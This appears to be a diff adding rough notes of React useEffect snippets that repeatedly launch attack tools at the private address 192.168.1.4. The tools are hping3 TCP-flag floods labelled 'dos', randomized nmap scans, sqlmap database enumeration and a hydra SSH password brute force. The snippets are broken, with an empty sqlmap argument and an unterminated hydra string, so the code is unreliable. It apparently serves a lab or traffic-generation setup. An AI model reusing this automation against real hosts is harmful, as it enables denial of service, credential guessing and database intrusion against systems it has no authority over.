@@ -1,0 +1,37 @@
+dos:
+hping3:
+  useEffect(() => {
+    const options:string[]=["-S", "-F", "-R", "-P", "-A", "-U"]
+    if(hping3.loading === false){
+      const randomElement = options[Math.floor(Math.random() * options.length)];
+      console.log("options", randomElement)
+      hping3.hping3Model("192.168.1.4", randomElement);
+    }
+  }, [hping3.loading])
+
+port scan:
+  useEffect(() => {
+    const options:string[]=["-d", "-dd", "-Pn", "-sU", "-s0"]
+    if(nmap.loading === false){
+      const randomElement = options[Math.floor(Math.random() * options.length)];
+      console.log("options", randomElement)
+      nmap.nmapModel("192.168.1.4", randomElement);
+    }
+  }, [nmap.loading])
+
+sql injection:
+  useEffect(() => {
+    const options:string[]=["--tables", "--columns", "-a", "--current-db", "--current-user", "--schema"]
+    if(sqlmap.loading === false){
+      const randomElement = options[Math.floor(Math.random() * options.length)];
+      console.log("options", randomElement)
+      sqlmap.sqlmapModel("-u",, randomElement);
+    }
+  }, [sqlmap.loading])
+
+hydra:
+  useEffect(() => {
+    if(hydra.loading === false){
+      hydra.hydraModel("-L username.txt -P password.txt ssh://192.168.1.4:22)
+    }
+  }, [hydra.loading])
